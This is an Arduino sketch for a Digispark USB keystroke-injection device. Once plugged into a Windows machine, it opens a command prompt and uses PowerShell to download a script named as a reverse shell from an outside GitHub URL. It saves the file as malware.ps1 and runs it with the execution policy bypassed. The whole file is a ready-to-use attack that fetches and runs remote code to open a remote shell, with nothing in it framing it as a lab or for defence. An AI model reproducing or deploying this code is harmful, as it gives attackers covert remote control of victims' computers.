#include "DigiKeyboardDe.h"
void setup() {
  // put your setup code here, to run once:
  DigiKeyboardDe.sendKeyStroke(500);
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.println("cmd");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.println("cd / & mkdir win & cd /win & powershell wget 'https://raw.githubusercontent.com/GitSimonVetter/GFS_Frenzen/refs/heads/main/Commad/1_Befehl%20bestehende%20Connection/Linux-Smart-Client-Side-Script-ReverseShell.ps1' -OutFile malware.ps1");
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.println("powershell -ExecutionPolicy ByPass -File malware.ps1");
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(500);
}

void loop() {
  // put your main code here, to run repeatedly:
  // Usless
}
